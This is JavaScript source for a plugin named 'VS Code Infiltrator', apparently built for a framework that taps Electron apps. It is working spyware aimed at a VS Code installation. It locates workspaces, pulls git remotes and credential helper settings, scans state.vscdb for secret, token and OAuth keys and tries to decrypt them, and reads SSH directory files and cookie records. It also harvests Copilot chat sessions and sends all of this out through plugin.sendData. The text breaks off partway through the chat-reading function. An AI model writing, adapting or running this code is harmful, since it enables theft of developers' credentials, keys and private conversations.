// VS Code Infiltrator — main.js
// Extracts project state, git credentials, secrets, Copilot chat history,
// and provides file read/write from a tapped VS Code instance.
// Uses Electron APIs for cross-platform path resolution.

var fs = plugin.fs;
var path = plugin.path;
var childProcess = plugin.childProcess;
var os = plugin.os;

// ===== Cross-platform paths (resolved at bootstrap) =====
var userData = '';       // e.g. ~/.config/Code (Linux), ~/Library/Application Support/Code (macOS), %APPDATA%/Code (Windows)
var userDir = '';        // userData + '/User'
var globalStorageDir = '';
var workspaceStorageDir = '';
var homeDir = '';
var extensionsDir = '';
var sshDir = '';
var workspacePath = '';
var workspaceStorageHash = ''; // the hash directory for current workspace
var platform = plugin.os.platform(); // 'linux', 'darwin', 'win32'
var vscodeWindowId = null; // renderer window ID for executeInRenderer

// ===== Helpers =====

function safeReadFile(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8');
    } catch (e) {
        return null;
    }
}

function safeReadDir(dirPath) {
    try {
        return fs.readdirSync(dirPath);
    } catch (e) {
        return [];
    }
}

function safeStatSync(p) {
    try {
        return fs.statSync(p);
    } catch (e) {
        return null;
    }
}

function safeParse(json) {
    try {
        return JSON.parse(json);
    } catch (e) {
        return null;
    }
}

// Run a shell command, return stdout or null
function execSafe(cmd, options) {
    try {
        var opts = Object.assign({ timeout: 10000, encoding: 'utf8' }, options || {});
        // Ensure Python outputs UTF-8 on Windows (default is system code page like cp1252,
        // which crashes on emoji/unicode in GitHub API responses, repo descriptions, etc.)
        if (!opts.env) {
            try {
                opts.env = Object.assign({}, process.env, { PYTHONIOENCODING: 'utf-8' });
            } catch (e) {} // process.env may not be available in all contexts
        }
        return childProcess.execSync(cmd, opts).trim();
    } catch (e) {
        return null;
    }
}

// Query a SQLite .vscdb file using python subprocess
// Returns parsed JSON array of rows, or null on failure
var _pythonCmd = null; // cached python command name

function findPython() {
    if (_pythonCmd) return _pythonCmd;
    // On Linux/macOS: python3, on Windows: python or py
    var candidates = platform === 'win32' ? ['python', 'py', 'python3'] : ['python3', 'python'];
    for (var i = 0; i < candidates.length; i++) {
        var test = execSafe(candidates[i] + ' --version', { timeout: 3000 });
        if (test) { _pythonCmd = candidates[i]; return _pythonCmd; }
    }
    return null;
}

function queryVscdb(dbPath, sql) {
    try {
        var py = findPython();
        if (!py) return null;

        if (platform === 'win32') {
            // Windows: use forward slashes in the path for Python, double-quote everything
            var winPath = dbPath.replace(/\\/g, '/');
            var pyCmd = py + ' -c "import sqlite3,json,sys; ' +
                "conn=sqlite3.connect('" + winPath + "'); " +
                "cur=conn.cursor(); cur.execute('" + sql + "'); " +
                'print(json.dumps(cur.fetchall())); conn.close()"';
        } else {
            // Unix: single-quote escaping
            var escapedPath = dbPath.replace(/'/g, "'\\''");
            var escapedSql = sql.replace(/'/g, "'\\''");
            var pyCmd = py + " -c \"import sqlite3,json,sys; " +
                "conn=sqlite3.connect('" + escapedPath + "'); " +
                "cur=conn.cursor(); cur.execute('" + escapedSql + "'); " +
                "print(json.dumps(cur.fetchall())); conn.close()\"";
        }
        var result = execSafe(pyCmd, { timeout: 5000 });
        if (result) return safeParse(result);
        return null;
    } catch (e) {
        return null;
    }
}

// ===== Bootstrap =====

function bootstrap() {
    try {
        // Resolve base paths via Electron API
        userData = plugin.electron.app.getPath('userData'); // e.g. ~/.config/Code
        homeDir = plugin.electron.app.getPath('home');
    } catch (e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: 'Failed to get Electron paths: ' + String(e) });
        return;
    }

    userDir = path.join(userData, 'User');
    globalStorageDir = path.join(userDir, 'globalStorage');
    workspaceStorageDir = path.join(userDir, 'workspaceStorage');
    extensionsDir = path.join(homeDir, '.vscode', 'extensions');
    sshDir = path.join(homeDir, '.ssh');

    // Find workspace path from storage.json or workspace state DBs
    workspacePath = discoverWorkspacePath();

    // Find the workspace storage hash directory
    if (workspacePath) {
        workspaceStorageHash = findWorkspaceStorageHash(workspacePath);
    }

    // Find the VS Code renderer window for executeInRenderer calls
    var windows = plugin.getWindows();
    for (var w = 0; w < windows.length; w++) {
        // VS Code window URLs contain 'workbench' or the window is the main editor
        if (windows[w].url && (windows[w].url.indexOf('workbench') !== -1 ||
            windows[w].title && windows[w].title.indexOf('Visual Studio Code') !== -1)) {
            vscodeWindowId = windows[w].id;
            break;
        }
    }
    // Fallback: just use the first window
    if (!vscodeWindowId && windows.length > 0) {
        vscodeWindowId = windows[0].id;
    }

    plugin.sendData('_debug', {
        phase: 'bootstrap',
        userData: userData,
        homeDir: homeDir,
        workspacePath: workspacePath,
        workspaceStorageHash: workspaceStorageHash,
        platform: platform,
        windowCount: windows.length,
        vscodeWindowId: vscodeWindowId
    });

    // Auto-collect if setting enabled
    if (plugin.settings.autoCollect !== 0) {
        collectProjectInfo();
    }
}

function discoverWorkspacePath() {
    // Strategy 1: Read global storage.json for recent workspace info
    var storagePath = path.join(globalStorageDir, 'storage.json');
    var storageJson = safeReadFile(storagePath);
    if (storageJson) {
        var storage = safeParse(storageJson);
        if (storage) {
            // Check backupWorkspaces.folders
            if (storage.backupWorkspaces && storage.backupWorkspaces.folders &&
                storage.backupWorkspaces.folders.length > 0) {
                var folderUri = storage.backupWorkspaces.folders[0];
                if (typeof folderUri === 'object' && folderUri.folderUri) {
                    folderUri = folderUri.folderUri;
                }
                var folderPath = uriToPath(String(folderUri));
                if (folderPath) return folderPath;
            }
            // Check windowsState.lastActiveWindow
            if (storage.windowsState && storage.windowsState.lastActiveWindow &&
                storage.windowsState.lastActiveWindow.folder) {
                var folderPath2 = uriToPath(String(storage.windowsState.lastActiveWindow.folder));
                if (folderPath2) return folderPath2;
            }
        }
    }

    // Strategy 1b: Read windowsState from state.vscdb (newer VS Code versions
    // store workspace info here instead of / in addition to storage.json)
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var wsStateRows = queryVscdb(globalDb, 'SELECT value FROM ItemTable WHERE key = "windowsState"');
    if (wsStateRows && wsStateRows.length > 0) {
        var wsState = safeParse(wsStateRows[0][0]);
        if (wsState) {
            if (wsState.lastActiveWindow && wsState.lastActiveWindow.folder) {
                var folderPath3 = uriToPath(String(wsState.lastActiveWindow.folder));
                if (folderPath3) return folderPath3;
            }
            if (wsState.openedWindows) {
                for (var ow = 0; ow < wsState.openedWindows.length; ow++) {
                    if (wsState.openedWindows[ow].folder) {
                        var owPath = uriToPath(String(wsState.openedWindows[ow].folder));
                        if (owPath) return owPath;
                    }
                }
            }
        }
    }

    // Strategy 2: Scan workspace storage directories for workspace.json
    var wsEntries = safeReadDir(workspaceStorageDir);
    for (var i = 0; i < wsEntries.length; i++) {
        var wsJsonPath = path.join(workspaceStorageDir, wsEntries[i], 'workspace.json');
        var wsJson = safeReadFile(wsJsonPath);
        if (wsJson) {
            var wsData = safeParse(wsJson);
            if (wsData && wsData.folder) {
                var p = uriToPath(wsData.folder);
                if (p && safeStatSync(p)) return p;
            }
        }
    }

    return '';
}

function uriToPath(uri) {
    if (!uri) return '';
    // file:///path/to/folder → /path/to/folder
    if (uri.indexOf('file:///') === 0) {
        var decoded = uri.substring(7);
        try { decoded = decodeURIComponent(decoded); } catch (e) {}
        // On Windows, file:///C:/foo → C:/foo (strip leading slash before drive letter)
        if (platform === 'win32' && decoded.length > 2 && decoded[0] === '/' && decoded[2] === ':') {
            decoded = decoded.substring(1);
        }
        return decoded;
    }
    // Already a path
    if (uri.indexOf('/') === 0 || (platform === 'win32' && uri.length > 1 && uri[1] === ':')) {
        return uri;
    }
    return '';
}

function pathToUri(p) {
    if (!p) return '';
    var encoded = p.replace(/ /g, '%20');
    if (platform === 'win32') {
        return 'file:///' + encoded.replace(/\\/g, '/');
    }
    return 'file://' + encoded;
}

function findWorkspaceStorageHash(wsPath) {
    var wsEntries = safeReadDir(workspaceStorageDir);
    var targetUri = pathToUri(wsPath);

    for (var i = 0; i < wsEntries.length; i++) {
        var wsJsonPath = path.join(workspaceStorageDir, wsEntries[i], 'workspace.json');
        var wsJson = safeReadFile(wsJsonPath);
        if (wsJson) {
            var wsData = safeParse(wsJson);
            if (wsData && wsData.folder) {
                // Compare both as URI and as resolved path
                if (wsData.folder === targetUri || uriToPath(wsData.folder) === wsPath) {
                    return wsEntries[i];
                }
            }
        }
    }
    return '';
}

// ===== Data Collection Functions =====

function collectProjectInfo() {
    var info = {
        workspacePath: workspacePath,
        openEditors: [],
        recentProjects: [],
        extensions: [],
        fileTree: []
    };

    // Try renderer-based tab query first (async, most accurate)
    // Falls back to DB strategies if renderer query fails
    queryRendererTabs().then(function(rendererEditors) {
        if (rendererEditors && rendererEditors.length > 0) {
            info.openEditors = rendererEditors;
        } else {
            // Fall back to DB-based strategies
            info.openEditors = findOpenEditors();
        }
        finishCollectProjectInfo(info);
    }).catch(function() {
        info.openEditors = findOpenEditors();
        finishCollectProjectInfo(info);
    });
}

function queryRendererTabs() {
    if (!vscodeWindowId) return Promise.resolve(null);

    // Query VS Code's renderer DOM for open tab elements
    // VS Code tabs have .tab class with a data-resource-name or title attribute
    // containing the file path
    var code = '(function() {' +
        '  var results = [];' +
        '  var seen = {};' +
        // Strategy A: Query tab elements in the editor tab bar
        '  var tabs = document.querySelectorAll(".tab");' +
        '  for (var i = 0; i < tabs.length; i++) {' +
        '    var t = tabs[i];' +
        '    var label = t.querySelector(".label-name") || t.querySelector(".monaco-icon-label");' +
        '    var title = (label && label.title) || t.title || t.getAttribute("aria-label") || "";' +
        // Extract file path from title (VS Code shows full path in title attr)
        '    if (title && (title.indexOf("/") !== -1 || title.indexOf("\\\\") !== -1) && !seen[title]) {' +
        '      seen[title] = true;' +
        '      results.push(title);' +
        '    }' +
        '  }' +
        // Strategy B: Check tab aria-label which often has the full path
        '  if (results.length === 0) {' +
        '    var ariaLabels = document.querySelectorAll("[role=\\"tab\\"]");' +
        '    for (var j = 0; j < ariaLabels.length; j++) {' +
        '      var al = ariaLabels[j].getAttribute("aria-label") || "";' +
        // aria-label format is often "filename, path/to/file"
        '      var title2 = ariaLabels[j].title || "";' +
        '      var p = title2 || al;' +
        '      if (p && (p.indexOf("/") !== -1 || p.indexOf("\\\\") !== -1) && !seen[p]) {' +
        '        seen[p] = true;' +
        '        results.push(p);' +
        '      }' +
        '    }' +
        '  }' +
        // Strategy C: Find open file paths from breadcrumb or editor title
        '  var breadcrumbs = document.querySelectorAll(".monaco-breadcrumb-item");' +
        '  return JSON.stringify(results);' +
        '})()';

    return plugin.executeInRenderer(vscodeWindowId, code).then(function(raw) {
        if (!raw) return null;
        try {
            var paths = JSON.parse(raw);
            if (Array.isArray(paths) && paths.length > 0) {
                // Clean up paths — some might have extra info like " (modified)"
                var clean = [];
                for (var i = 0; i < paths.length; i++) {
                    var p = paths[i];
                    // Strip trailing status markers
                    p = p.replace(/\s*[\u2022\u25CF]?\s*$/, '');
                    // If it looks like a file path, keep it
                    if (p.indexOf('/') !== -1 || p.indexOf('\\') !== -1) {
                        clean.push(p);
                    }
                }
                return clean.length > 0 ? clean : null;
            }
        } catch (e) {}
        return null;
    });
}

function finishCollectProjectInfo(info) {

    // Recently opened projects — from global state.vscdb
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var recentRows = queryVscdb(globalDb, 'SELECT value FROM ItemTable WHERE key = "history.recentlyOpenedPathsList"');
    if (recentRows && recentRows.length > 0) {
        var recentData = safeParse(recentRows[0][0]);
        if (recentData && recentData.entries) {
            for (var r = 0; r < recentData.entries.length && r < 20; r++) {
                var entry = recentData.entries[r];
                var entryPath = '';
                if (entry.folderUri) entryPath = uriToPath(entry.folderUri);
                else if (entry.fileUri) entryPath = uriToPath(entry.fileUri);
                else if (entry.workspace && entry.workspace.configPath) {
                    entryPath = uriToPath(entry.workspace.configPath);
                }
                if (entryPath) info.recentProjects.push(entryPath);
            }
        }
    }

    // Installed extensions — scan extensions dir
    var extEntries = safeReadDir(extensionsDir);
    for (var e = 0; e < extEntries.length; e++) {
        // Skip hidden files
        if (extEntries[e][0] === '.') continue;
        info.extensions.push(extEntries[e]);
    }

    // Top-level file tree of workspace
    if (workspacePath) {
        var treeEntries = safeReadDir(workspacePath);
        for (var t = 0; t < treeEntries.length; t++) {
            var fullPath = path.join(workspacePath, treeEntries[t]);
            var stat = safeStatSync(fullPath);
            info.fileTree.push({
                name: treeEntries[t],
                type: stat && stat.isDirectory() ? 'dir' : 'file',
                size: stat ? stat.size : 0
            });
        }
    }

    plugin.sendData('project_info', info);
}

function findOpenEditors() {
    var editors = [];

    // Strategy 1: workspace state.vscdb — memento/workbench.parts.editor
    if (workspaceStorageHash) {
        var wsDb = path.join(workspaceStorageDir, workspaceStorageHash, 'state.vscdb');
        var editorRows = queryVscdb(wsDb, 'SELECT value FROM ItemTable WHERE key = "memento/workbench.parts.editor"');
        if (editorRows && editorRows.length > 0) {
            var editorState = safeParse(editorRows[0][0]);
            if (editorState) {
                editors = extractEditorPaths(editorState);
                if (editors.length > 0) return editors;
            }
        }
    }

    // Strategy 2: Scan ALL keys in workspace state.vscdb for file:// URIs
    // VS Code frequently changes its key naming — scan everything rather than filtering by key name
    if (workspaceStorageHash) {
        var wsDb2 = path.join(workspaceStorageDir, workspaceStorageHash, 'state.vscdb');
        var allRows = queryVscdb(wsDb2, 'SELECT key, value FROM ItemTable');
        if (allRows) {
            var foundPaths = [];
            for (var i = 0; i < allRows.length; i++) {
                var val = allRows[i][1] || '';
                // Regex scan ALL values for file:// URIs
                var uriMatches = val.match(/file:\/\/\/[^"'\s,}\]]+/g);
                if (uriMatches) {
                    for (var u = 0; u < uriMatches.length; u++) {
                        var p = uriToPath(uriMatches[u]);
                        if (p) foundPaths.push(p);
                    }
                }
            }
            // Deduplicate and filter to actual files (not directories, not .git internals)
            var seen = {};
            for (var j = 0; j < foundPaths.length; j++) {
                var fp = foundPaths[j];
                if (seen[fp]) continue;
                seen[fp] = true;
                // Skip VS Code internal paths, .git, and workspace storage paths
                if (fp.indexOf('/.git/') !== -1 || fp.indexOf('\\.git\\') !== -1) continue;
                if (fp.indexOf('/workspaceStorage/') !== -1 || fp.indexOf('\\workspaceStorage\\') !== -1) continue;
                if (fp.indexOf('/globalStorage/') !== -1 || fp.indexOf('\\globalStorage\\') !== -1) continue;
                var st = safeStatSync(fp);
                if (st && !st.isDirectory()) editors.push(fp);
            }
            if (editors.length > 0) return editors;
        }
    }

    // Strategy 3: Scan ALL workspace storage directories (not just current hash)
    // Use the same broad file:// URI scan approach
    var wsEntries = safeReadDir(workspaceStorageDir);
    for (var w = 0; w < wsEntries.length; w++) {
        if (wsEntries[w] === workspaceStorageHash) continue;
        var otherDb = path.join(workspaceStorageDir, wsEntries[w], 'state.vscdb');
        // First try the specific key
        var otherRows = queryVscdb(otherDb, 'SELECT value FROM ItemTable WHERE key = "memento/workbench.parts.editor"');
        if (otherRows && otherRows.length > 0) {
            var otherState = safeParse(otherRows[0][0]);
            if (otherState) {
                var otherPaths = extractEditorPaths(otherState);
                if (otherPaths.length > 0) return otherPaths;
            }
        }
        // Then try broad file:// scan on this DB
        var allOtherRows = queryVscdb(otherDb, 'SELECT value FROM ItemTable');
        if (allOtherRows) {
            var otherFoundPaths = [];
            for (var ow = 0; ow < allOtherRows.length; ow++) {
                var oval = allOtherRows[ow][0] || '';
                var oMatches = oval.match(/file:\/\/\/[^"'\s,}\]]+/g);
                if (oMatches) {
                    for (var om = 0; om < oMatches.length; om++) {
                        var op = uriToPath(oMatches[om]);
                        if (op && op.indexOf('/.git/') === -1 && op.indexOf('\\.git\\') === -1 && op.indexOf('/workspaceStorage/') === -1 && op.indexOf('\\workspaceStorage\\') === -1) {
                            otherFoundPaths.push(op);
                        }
                    }
                }
            }
            var oSeen = {};
            var oEditors = [];
            for (var oj = 0; oj < otherFoundPaths.length; oj++) {
                if (!oSeen[otherFoundPaths[oj]]) {
                    oSeen[otherFoundPaths[oj]] = true;
                    var oSt = safeStatSync(otherFoundPaths[oj]);
                    if (oSt && !oSt.isDirectory()) oEditors.push(otherFoundPaths[oj]);
                }
            }
            if (oEditors.length > 0) return oEditors;
        }
    }

    // Strategy 4: Global state.vscdb — windowsState tracks open windows/editors
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var windowRows = queryVscdb(globalDb, 'SELECT value FROM ItemTable WHERE key = "windowsState"');
    if (windowRows && windowRows.length > 0) {
        var windowState = safeParse(windowRows[0][0]);
        if (windowState) {
            editors = extractEditorPaths(windowState);
            if (editors.length > 0) return editors;
        }
    }

    // Strategy 5: storage.json backupWorkspaces may have open file info
    var storagePath = path.join(globalStorageDir, 'storage.json');
    var storageJson = safeReadFile(storagePath);
    if (storageJson) {
        var storage = safeParse(storageJson);
        if (storage) {
            editors = extractEditorPaths(storage);
            if (editors.length > 0) return editors;
        }
    }

    return editors;
}

function extractEditorPaths(editorState) {
    // Walk the editor state object looking for resource URIs
    var paths = [];
    deepFindEditorPaths(editorState, paths, 0);
    // De-duplicate
    var seen = {};
    var unique = [];
    for (var i = 0; i < paths.length; i++) {
        if (!seen[paths[i]]) {
            seen[paths[i]] = true;
            unique.push(paths[i]);
        }
    }
    return unique;
}

function deepFindEditorPaths(obj, paths, depth) {
    if (depth > 15 || !obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) deepFindEditorPaths(obj[i], paths, depth + 1);
        return;
    }
    // Look for any string property that contains a file:// URI
    var uriProps = ['resource', 'uri', 'url', 'path', 'filePath', 'folderUri', 'fileUri',
                    'configPath', 'fsPath', 'backupPath', 'originalUri'];
    for (var u = 0; u < uriProps.length; u++) {
        var val = obj[uriProps[u]];
        if (val && typeof val === 'string' && val.indexOf('file:') === 0) {
            var p = uriToPath(val);
            if (p) paths.push(p);
        }
    }
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        deepFindEditorPaths(obj[keys[k]], paths, depth + 1);
    }
}

function collectGitInfo() {
    if (!workspacePath) {
        plugin.sendData('git_info', { error: 'No workspace path found' });
        return;
    }

    var opts = { cwd: workspacePath };
    var info = {
        remotes: execSafe('git remote -v', opts) || '',
        branch: execSafe('git rev-parse --abbrev-ref HEAD', opts) || '',
        log: execSafe('git log --oneline -20', opts) || '',
        userName: execSafe('git config user.name', opts) || '',
        userEmail: execSafe('git config user.email', opts) || '',
        credentialHelper: execSafe('git config credential.helper', opts) || '',
        workspacePath: workspacePath
    };

    plugin.sendData('git_info', info);
}

function collectSecrets() {
    var entries = [];

    // Read all keys from global state.vscdb — look for secret:// and auth tokens
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var rows = queryVscdb(globalDb, 'SELECT key, value FROM ItemTable');
    if (rows) {
        for (var i = 0; i < rows.length; i++) {
            var key = rows[i][0];
            var value = rows[i][1];
            // Look for secret-related keys
            if (key && (
                key.indexOf('secret') !== -1 ||
                key.indexOf('token') !== -1 ||
                key.indexOf('auth') !== -1 ||
                key.indexOf('credential') !== -1 ||
                key.indexOf('oauth') !== -1 ||
                key.indexOf('session') !== -1 ||
                key.indexOf('github') !== -1 ||
                key.indexOf('azure') !== -1 ||
                key.indexOf('microsoft') !== -1
            )) {
                // Try to decrypt safeStorage-encrypted values
                var displayVal = value;
                var decrypted = decryptSafeStorageValue(value);
                if (decrypted) {
                    displayVal = '[DECRYPTED] ' + decrypted;
                }
                if (displayVal && displayVal.length > 2000) {
                    displayVal = displayVal.substring(0, 2000) + '... [truncated]';
                }
                entries.push({ key: key, value: displayVal });
            }
        }
    }

    plugin.sendData('secrets', { source: 'globalStorage/state.vscdb', entries: entries });
}

function collectSSHKeys() {
    var keys = [];
    var sshEntries = safeReadDir(sshDir);
    for (var i = 0; i < sshEntries.length; i++) {
        var name = sshEntries[i];
        var fullPath = path.join(sshDir, name);
        var stat = safeStatSync(fullPath);
        if (!stat || stat.isDirectory()) continue;

        var entry = {
            name: name,
            size: stat.size,
            isPublic: name.indexOf('.pub') !== -1,
            content: null
        };

        // Auto-read public keys and known_hosts/config, not private keys
        if (entry.isPublic || name === 'known_hosts' || name === 'config' || name === 'authorized_keys') {
            entry.content = safeReadFile(fullPath);
        }

        keys.push(entry);
    }

    plugin.sendData('ssh_keys', { keys: keys });
}

function collectCookies() {
    // VS Code Cookies SQLite DB (Chromium format)
    var cookieDb = path.join(userData, 'Cookies');
    var rows = queryVscdb(cookieDb, 'SELECT host_key, name, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 200');
    var cookies = [];
    if (rows) {
        for (var i = 0; i < rows.length; i++) {
            cookies.push({
                host: rows[i][0],
                name: rows[i][1],
                path: rows[i][2],
                expires: rows[i][3],
                secure: rows[i][4],
                httpOnly: rows[i][5]
            });
        }
    }
    plugin.sendData('cookies', { cookies: cookies });
}

function collectChatSessions() {
    var sessions = [];

    // Workspace-specific chat sessions (.jsonl format)
    if (workspaceStorageHash) {
        var wsSessionDir = path.join(workspaceStorageDir, workspaceStorageHash, 'chatSessions');
        scanChatDir(wsSessionDir, 'workspace', sessions);
        // Chat editing sessions (subdirectory format with state.json)
        var wsEditDir = path.join(workspaceStorageDir, workspaceStorageHash, 'chatEditingSessions');
        scanChatEditingDir(wsEditDir, 'workspace-edit', sessions);
    }

    // Global (empty window) chat sessions
    var globalSessionDir = path.join(globalStorageDir, 'emptyWindowChatSessions');
    scanChatDir(globalSessionDir, 'global', sessions);
    // Global chat editing sessions
    var globalEditDir = path.join(globalStorageDir, 'emptyWindowChatEditingSessions');
    scanChatEditingDir(globalEditDir, 'global-edit', sessions);

    // Also scan all workspace storage directories for chat sessions
    var wsEntries = safeReadDir(workspaceStorageDir);
    for (var i = 0; i < wsEntries.length; i++) {
        if (wsEntries[i] === workspaceStorageHash) continue; // already scanned
        var chatDir = path.join(workspaceStorageDir, wsEntries[i], 'chatSessions');
        scanChatDir(chatDir, 'workspace:' + wsEntries[i], sessions);
        var editDir = path.join(workspaceStorageDir, wsEntries[i], 'chatEditingSessions');
        scanChatEditingDir(editDir, 'workspace-edit:' + wsEntries[i], sessions);
    }

    plugin.sendData('chat_sessions', { sessions: sessions });
}

function scanChatDir(dirPath, source, sessions) {
    var entries = safeReadDir(dirPath);
    for (var i = 0; i < entries.length; i++) {
        if (entries[i].indexOf('.jsonl') === -1) continue;
        var fullPath = path.join(dirPath, entries[i]);
        var stat = safeStatSync(fullPath);

        // Scan all lines to get title and request count
        // kind:0 header often has empty requests; real data comes in kind:1/kind:2 updates
        var title = '';
        var requestCount = 0;
        try {
            var fileContent = safeReadFile(fullPath);
            if (fileContent) {
                var lines = fileContent.split('\n');
                for (var li = 0; li < lines.length; li++) {
                    var line = lines[li].trim();
                    if (!line) continue;
                    var parsed = safeParse(line);
                    if (!parsed) continue;

                    if (parsed.kind === 0 && parsed.v) {
                        title = parsed.v.title || parsed.v.customTitle || title;
                        if (parsed.v.requests && parsed.v.requests.length > requestCount) {
                            requestCount = parsed.v.requests.length;
                        }
                        // Use first request text as title preview
                        if (!title && parsed.v.requests && parsed.v.requests.length > 0) {
                            var firstMsg = parsed.v.requests[0].message;
                            if (firstMsg && firstMsg.text) {
                                title = firstMsg.text.substring(0, 80);
                            }
                        }
                    }

                    // kind:1 updates — check for requests array or title updates
                    if (parsed.kind === 1 && parsed.k) {
                        var kp = Array.isArray(parsed.k) ? parsed.k : [parsed.k];
                        if (kp[0] === 'requests' && kp.length === 1 && Array.isArray(parsed.v)) {
                            if (parsed.v.length > requestCount) requestCount = parsed.v.length;
                            // Extract title from first request if we don't have one
                            if (!title && parsed.v.length > 0 && parsed.v[0].message && parsed.v[0].message.text) {
                                title = parsed.v[0].message.text.substring(0, 80);
                            }
                        }
                        if ((kp[0] === 'customTitle' || kp[0] === 'title') && typeof parsed.v === 'string') {
                            title = parsed.v;
                        }
                    }

                    // kind:2 — array patches
                    if (parsed.kind === 2 && parsed.k) {
                        var k2p = Array.isArray(parsed.k) ? parsed.k : [parsed.k];
                        if (k2p[0] === 'requests' && Array.isArray(parsed.v)) {
                            if (parsed.v.length > requestCount) requestCount = parsed.v.length;
                        }
                    }
                }
            }
        } catch (e) {}

        sessions.push({
            file: fullPath,
            name: entries[i],
            source: source,
            title: title,
            requestCount: requestCount,
            size: stat ? stat.size : 0,
            modified: stat ? stat.mtime.toISOString() : ''
        });
    }
}

function scanChatEditingDir(dirPath, source, sessions) {
    // chatEditingSessions/ contains subdirectories, each with state.json (or .jsonl)
    var entries = safeReadDir(dirPath);
    for (var i = 0; i < entries.length; i++) {
        var subDir = path.join(dirPath, entries[i]);
        var stat = safeStatSync(subDir);
        if (!stat || !stat.isDirectory()) continue;

        // Look for state.json or state.jsonl or any .jsonl file
        var subEntries = safeReadDir(subDir);
        for (var j = 0; j < subEntries.length; j++) {
            var fileName = subEntries[j];
            if (fileName !== 'state.json' && fileName !== 'state.jsonl' &&
                fileName.indexOf('.jsonl') === -1 && fileName.indexOf('.json') === -1) continue;

            var fullPath = path.join(subDir, fileName);
            var fileStat = safeStatSync(fullPath);
            if (!fileStat || fileStat.isDirectory()) continue;

            var title = '';
            var requestCount = 0;
            try {
                var content = safeReadFile(fullPath);
                if (content) {
                    // Could be JSON or JSONL
                    if (fileName.indexOf('.jsonl') !== -1) {
                        // JSONL — parse first line
                        var nlIdx = content.indexOf('\n');
                        var line0 = nlIdx > -1 ? content.substring(0, nlIdx) : content;
                        var parsed = safeParse(line0);
                        if (parsed && parsed.v) {
                            title = parsed.v.title || parsed.v.customTitle || '';
                            if (parsed.v.requests) requestCount = parsed.v.requests.length;
                        }
                    } else {
                        // Plain JSON
                        var parsed2 = safeParse(content);
                        if (parsed2) {
                            title = parsed2.title || parsed2.customTitle || '';
                            if (parsed2.requests) requestCount = parsed2.requests.length;
                            if (parsed2.chatMessages) requestCount = parsed2.chatMessages.length;
                        }
                    }
                }
            } catch (e) {}

            sessions.push({
                file: fullPath,
                name: entries[i] + '/' + fileName,
                source: source,
                title: title || entries[i],
                requestCount: requestCount,
                size: fileStat ? fileStat.size : 0,
                modified: fileStat ? fileStat.mtime.toISOString() : ''
            });
        }
    }
}

function readChatSession(sessionFile) {
    var content = safeReadFile(sessionFile);
    if (!content) {
        plugin.sendData('_error', { phase: 'read_chat', error: 'Cannot read: ' + sessionFile });
        return;
    }

    // Detect plain JSON (chatEditingSessions state.json) vs JSONL
    var trimmed = content.trim();
    if (trimmed[0] === '{' && sessionFile.indexOf('.jsonl') === -1) {
        // Try parsing as a single JSON object
        var jsonData = safeParse(trimmed);
        if (jsonData) {
            return readChatSessionJson(sessionFile, jsonData);
        }
    }

    var lines = content.split('\n');
    var title = '';
    var messages = [];
    var seenTexts = {}; // de-duplicate since kind:1 updates may re-include earlier requests

    for (var i = 0; i < lines.length; i++) {
        var line = lines[i].trim();
        if (!line) continue;
        var obj = safeParse(line);
        if (!obj) continue;

        if (obj.kind === 0 && obj.v) {
            // kind:0 is the full session snapshot — requests are in obj.v.requests
            title = obj.v.title || obj.v.customTitle || title;
            var requests = obj.v.requests;
            if (Array.isArray(requests)) {
                for (var r = 0; r < requests.length; r++) {
                    var msg = extractChatMessage(requests[r]);
                    if (msg && msg.text && !seenTexts[msg.text]) {
                        seenTexts[msg.text] = true;
                        messages.push(msg);
                    }
                }
            }
        }

        if (obj.kind === 1 && obj.k) {
            // kind:1 is an incremental update; k is a key path, v is the new value
            var kPath = Array.isArray(obj.k) ? obj.k : [obj.k];

            // k:["requests"] — full requests array replacement
            if (kPath[0] === 'requests' && kPath.length === 1 && Array.isArray(obj.v)) {
                for (var r2 = 0; r2 < obj.v.length; r2++) {
                    var msg2 = extractChatMessage(obj.v[r2]);
                    if (msg2 && msg2.text && !seenTexts[msg2.text]) {
                        seenTexts[msg2.text] = true;
                        messages.push(msg2);
                    }
                }
            }

            // k:["requests", N, ...] — update to a specific request (e.g. result, response)
            // Try to extract it as a full request object if v looks like one
            if (kPath[0] === 'requests' && kPath.length >= 2 && typeof kPath[1] === 'number') {
                if (kPath.length === 2 && obj.v && typeof obj.v === 'object' && !Array.isArray(obj.v)) {
                    // Direct request replacement at index N
                    var msg2b = extractChatMessage(obj.v);
                    if (msg2b && msg2b.text && !seenTexts[msg2b.text]) {
                        seenTexts[msg2b.text] = true;
                        messages.push(msg2b);
                    }
                }
                // k:["requests", N, "response"] — update response on an existing message
                if (kPath.length === 3 && kPath[2] === 'response' && Array.isArray(obj.v)) {
                    var respText = extractResponseText(obj.v);
                    if (respText && messages.length > 0) {
                        // Apply to the message at this index if it exists
                        var idx = kPath[1];
                        if (idx < messages.length && !messages[idx].response) {
                            messages[idx].response = respText;
                        }
                    }
                }
                // k:["requests", N, "result"] — final result on an existing message
                if (kPath.length === 3 && kPath[2] === 'result' && obj.v) {
                    var resultResp = '';
                    if (obj.v.response) resultResp = extractResponseText(obj.v.response);
                    else if (typeof obj.v === 'string') resultResp = obj.v;
                    if (resultResp && messages.length > 0) {
                        var idx2 = kPath[1];
                        if (idx2 < messages.length) {
                            messages[idx2].response = resultResp;
                        }
                    }
                }
            }

            // k:["customTitle"] or k:["title"] is a title update
            if ((kPath[0] === 'customTitle' || kPath[0] === 'title') && typeof obj.v === 'string') {
                title = obj.v;
            }
        }

        // kind:2 — some VS Code versions use this for request array patches
        if (obj.kind === 2 && obj.k) {
            var k2Path = Array.isArray(obj.k) ? obj.k : [obj.k];
            if (k2Path[0] === 'requests' && Array.isArray(obj.v)) {
                for (var r3 = 0; r3 < obj.v.length; r3++) {
                    var msg3 = extractChatMessage(obj.v[r3]);
                    if (msg3 && msg3.text && !seenTexts[msg3.text]) {
                        seenTexts[msg3.text] = true;
                        messages.push(msg3);
                    }
                }
            }
        }

        // Fallback: direct message format at top level
        if (obj.message && obj.message.text && !seenTexts[obj.message.text]) {
            seenTexts[obj.message.text] = true;
            var directMsg = {
                role: 'exchange',
                text: obj.message.text,
